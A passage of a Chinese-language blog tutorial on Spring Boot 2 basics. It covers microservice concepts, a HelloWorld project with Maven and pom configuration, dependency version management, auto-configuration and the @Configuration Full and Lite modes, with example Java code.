href="https://martinfowler.com/articles/microservices.html">James Lewis and Martin Fowler (2014)</a></p></blockquote><ul><li>微服务是一种架构风格</li><li>一个应用拆分为一组小型服务</li><li>每个服务运行在自己的进程内，也就是可独立部署和升级</li><li>服务之间使用轻量级HTTP交互</li><li>服务围绕业务功能拆分</li><li>可以由全自动部署机制独立部署</li><li>去中心化，服务自治。服务可以使用不同的语言、不同的存储技术</li></ul><h3 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211310801.png" alt="在这里插入图片描述"></p><h4 id="分布式的困难"><a href="#分布式的困难" class="headerlink" title="分布式的困难"></a>分布式的困难</h4><ul><li>远程调用</li><li>服务发现</li><li>负载均衡</li><li>服务容错</li><li>配置管理</li><li>服务监控</li><li>链路追踪</li><li>日志管理</li><li>任务调度</li><li>……</li></ul><h4 id="分布式的解决"><a href="#分布式的解决" class="headerlink" title="分布式的解决"></a>分布式的解决</h4><ul><li>SpringBoot + SpringCloud</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004523307.png" alt="在这里插入图片描述"></p><h3 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h3><p>原生应用如何上云。 Cloud Native</p><h4 id="上云的困难"><a href="#上云的困难" class="headerlink" title="上云的困难"></a>上云的困难</h4><ul><li>服务自愈</li><li>弹性伸缩</li><li>服务隔离</li><li>自动化部署</li><li>灰度发布</li><li>流量治理</li><li>……</li></ul><h4 id="上云的解决"><a href="#上云的解决" class="headerlink" title="上云的解决"></a>上云的解决</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004621290.png" alt="在这里插入图片描述"></p><h2 id="04、基础入门-SpringBoot官方文档架构"><a href="#04、基础入门-SpringBoot官方文档架构" class="headerlink" title="04、基础入门-SpringBoot官方文档架构"></a>04、基础入门-SpringBoot官方文档架构</h2><ul><li><a href="https://spring.io/projects/spring-boot">Spring Boot官网</a></li><li><a href="https://docs.spring.io/spring-boot/docs/">Spring Boot官方文档</a></li></ul><h3 id="官网文档架构"><a href="#官网文档架构" class="headerlink" title="官网文档架构"></a>官网文档架构</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004733270.png" alt="在这里插入图片描述"><br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004828702.png" alt="在这里插入图片描述"></p><p><a href="https://github.com/spring-projects/spring-boot/wiki#release-notes">查看版本新特性</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005342147.png" alt="在这里插入图片描述"></p><h2 id="05、基础入门-SpringBoot-HelloWorld"><a href="#05、基础入门-SpringBoot-HelloWorld" class="headerlink" title="05、基础入门-SpringBoot-HelloWorld"></a>05、基础入门-SpringBoot-HelloWorld</h2><h3 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h3><ul><li>Java 8</li><li>Maven 3.3+</li><li>IntelliJ IDEA 2019.1.2</li></ul><h4 id="Maven配置文件"><a href="#Maven配置文件" class="headerlink" title="Maven配置文件"></a>Maven配置文件</h4><p>新添内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>jdk-1.8<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">activation</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeByDefault</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">activeByDefault</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">jdk</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">jdk</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activation</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="HelloWorld项目"><a href="#HelloWorld项目" class="headerlink" title="HelloWorld项目"></a>HelloWorld项目</h3><p>需求：浏览发送&#x2F;hello请求，响应 “Hello，Spring Boot 2”</p><h4 id="创建maven工程"><a href="#创建maven工程" class="headerlink" title="创建maven工程"></a>创建maven工程</h4><h4 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="创建主程序"><a href="#创建主程序" class="headerlink" title="创建主程序"></a>创建主程序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="编写业务"><a href="#编写业务" class="headerlink" title="编写业务"></a>编写业务</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="运行-amp-测试"><a href="#运行-amp-测试" class="headerlink" title="运行&amp;测试"></a>运行&amp;测试</h4><ul><li>运行<code>MainApplication</code>类</li><li>浏览器输入<code>http://localhost:8888/hello</code>，将会输出<code>Hello, Spring Boot 2!</code>。</li></ul><h4 id="设置配置"><a href="#设置配置" class="headerlink" title="设置配置"></a>设置配置</h4><p>maven工程的resource文件夹中创建application.properties文件。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 设置端口号</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8888</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.spring.io/spring-boot/docs/2.3.7.RELEASE/reference/html/appendix-application-properties.html#common-application-properties-server">更多配置信息</a></p><h4 id="打包部署"><a href="#打包部署" class="headerlink" title="打包部署"></a>打包部署</h4><p>在pom.xml添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在IDEA的Maven插件上点击运行 clean 、package，把helloworld工程项目的打包成jar包，</p><p>打包好的jar包被生成在helloworld工程项目的target文件夹内。</p><p>用cmd运行<code>java -jar boot-01-helloworld-1.0-SNAPSHOT.jar</code>，既可以运行helloworld工程项目。</p><p>将jar包直接在目标服务器执行即可。</p><h2 id="06、基础入门-SpringBoot-依赖管理特性"><a href="#06、基础入门-SpringBoot-依赖管理特性" class="headerlink" title="06、基础入门-SpringBoot-依赖管理特性"></a>06、基础入门-SpringBoot-依赖管理特性</h2><ul><li>父项目做依赖管理</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">依赖管理<br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>上面项目的父项目如下：<br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>它几乎声明了所有开发中常用的依赖的版本号，自动版本仲裁机制<br></code></pre></td></tr></table></figure><ul><li>开发导入starter场景启动器<ol><li>见到很多 spring-boot-starter-* ： *就某种场景</li><li>只要引入starter，这个场景的所有常规需要的依赖我们都自动引入</li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter">更多SpringBoot所有支持的场景</a></li><li>见到的  *-spring-boot-starter： 第三方为我们提供的简化开发的场景启动器。</li></ol></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">所有场景启动器最底层的依赖<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>无需关注版本号，自动版本仲裁</p><ol><li>引入依赖默认都可以不写版本</li><li>引入非版本仲裁的jar，要写版本号。</li></ol></li><li><p>可以修改默认版本号</p><ol><li>查看spring-boot-dependencies里面规定当前依赖的版本 用的 key。</li><li>在当前项目里面重写配置，如下面的代码。</li></ol></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.43<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><p>IDEA快捷键：</p><ul><li><code> ctrl + shift + alt + U</code>：以图的方式显示项目中依赖之间的关系。</li><li><code>alt + ins</code>：相当于Eclipse的 Ctrl + N，创建新类，新包等。</li></ul><h2 id="07、基础入门-SpringBoot-自动配置特性"><a href="#07、基础入门-SpringBoot-自动配置特性" class="headerlink" title="07、基础入门-SpringBoot-自动配置特性"></a>07、基础入门-SpringBoot-自动配置特性</h2><ul><li>自动配好Tomcat<ul><li>引入Tomcat依赖。</li><li>配置Tomcat</li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>自动配好SpringMVC</p><ul><li>引入SpringMVC全套组件</li><li>自动配好SpringMVC常用组件（功能）</li></ul></li><li><p>自动配好Web常见功能，如：字符编码问题</p><ul><li>SpringBoot帮我们配置好了所有web开发的常见场景</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1、返回我们IOC容器</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2、查看容器里面的组件</span><br>    String[] names = run.getBeanDefinitionNames();<br>    <span class="hljs-keyword">for</span> (String name : names) &#123;<br>        System.out.println(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>默认的包结构<ul><li>主程序所在包及其下面的所有子包里面的组件都会被默认扫描进来</li><li>无需以前的包扫描配置</li><li>想要改变扫描路径<ul><li>@SpringBootApplication(scanBasePackages&#x3D;”com.lun”)</li><li>@ComponentScan 指定扫描路径</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br>等同于<br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.lun&quot;)</span><br></code></pre></td></tr></table></figure><ul><li><p>各种配置拥有默认值</p><ul><li>默认配置最终都是映射到某个类上，如：<code>MultipartProperties</code></li><li>配置文件的值最终会绑定每个类上，这个类会在容器中创建对象</li></ul></li><li><h2 id="按需加载所有自动配置项-非常多的starter-引入了哪些场景这个场景的自动配置才会开启-SpringBoot所有的自动配置功能都在-spring-boot-autoconfigure-包里面"><a href="#按需加载所有自动配置项-非常多的starter-引入了哪些场景这个场景的自动配置才会开启-SpringBoot所有的自动配置功能都在-spring-boot-autoconfigure-包里面" class="headerlink" title="按需加载所有自动配置项- 非常多的starter- 引入了哪些场景这个场景的自动配置才会开启- SpringBoot所有的自动配置功能都在 spring-boot-autoconfigure 包里面"></a>按需加载所有自动配置项<br>- 非常多的starter<br>- 引入了哪些场景这个场景的自动配置才会开启<br>- SpringBoot所有的自动配置功能都在 spring-boot-autoconfigure 包里面</h2></li><li><p>……</p></li></ul><h2 id="08、底层注解-Configuration详解"><a href="#08、底层注解-Configuration详解" class="headerlink" title="08、底层注解-@Configuration详解"></a>08、底层注解-@Configuration详解</h2><ul><li>基本使用<ul><li>Full模式与Lite模式</li><li>示例</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 1、配置类里面使用<span class="hljs-doctag">@Bean</span>标注在方法上给容器注册组件，默认也是单实例的</span><br><span class="hljs-comment"> * 2、配置类本身也是组件</span><br><span class="hljs-comment"> * 3、proxyBeanMethods：代理bean的方法</span><br><span class="hljs-comment"> *      Full(proxyBeanMethods = true)（保证每个<span class="hljs-doctag">@Bean</span>方法被调用多少次返回的组件都是单实例的）（默认）</span><br><span class="hljs-comment"> *      Lite(proxyBeanMethods = false)（每个<span class="hljs-doctag">@Bean</span>方法被调用多少次返回的组件都是新创建的）</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span> <span class="hljs-comment">//告诉SpringBoot这是一个配置类 == 配置文件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Full:外部无论对配置类中的这个组件注册方法调用多少次获取的都是之前注册容器中的单实例对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span> <span class="hljs-comment">//给容器中添加组件。以方法名作为组件的id。返回类型就是组件类型。返回的值，就是组件在容器中的实例</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">zhangsan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-comment">//user组件依赖了Pet组件</span><br>        zhangsan.setPet(tomcatPet());<br>        <span class="hljs-keyword">return</span> zhangsan;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&quot;tom&quot;)</span><br>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcatPet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>@Configuration测试代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.atguigu.boot&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1、返回我们IOC容器</span><br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2、查看容器里面的组件</span><br>        String[] names = run.getBeanDefinitionNames();<br>        <span class="hljs-keyword">for</span> (String name : names) &#123;<br>            System.out.println(name);<br>        &#125;<br><br>    <span class="hljs-comment">//3、从容器中获取组件</span><br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom01</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom02</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br>        System.out.println(<span class="hljs-string">&quot;组件：&quot;</span>+(tom01 == tom02));<br><br>    <span class="hljs-comment">//4、com.atguigu.boot.config.MyConfig$$EnhancerBySpringCGLIB$$51f1e1ca@1654a892</span><br>        <span class="hljs-type">MyConfig</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> run.getBean(MyConfig.class);<br>        System.out.println(bean);<br><br>    <span class="hljs-comment">//如果@Configuration(proxyBeanMethods = true)代理对象调用方法。SpringBoot总会检查这个组件是否在容器中有。</span><br>        <span class="hljs-comment">//保持组件单实例</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> bean.user01();<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> bean.user01();<br>        System.out.println(user == user1);<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;user01&quot;</span>, User.class);<br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br><br>        System.out.println(<span class="hljs-string">&quot;用户的宠物：&quot;</span>+(user01.getPet() == tom));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>最佳实战<ul><li>配置 类组件之间<strong>无依赖关系</strong>用Lite模式加速容器启动过程，减少判断</li><li>配置 类组件之间<strong>有依赖关系</strong>，方法会被调用得到之前单实例组件，用Full模式（默认）</li></ul></li></ul><blockquote><p>lite 英 [laɪt]   美 [laɪt]<br>adj. 低热量的，清淡的(light的一种拼写方法);类似…的劣质品</p></blockquote><hr><p>IDEA快捷键：</p><ul><li><code>Alt + Ins</code>:生成getter，setter、构造器等代码。</li><li><code>Ctrl + Alt + B</code>:查看类的具体实现代码。</li></ul><h2 id="09、底层注解-Import导入组件"><a href="#09、底层注解-Import导入组件" class="headerlink" 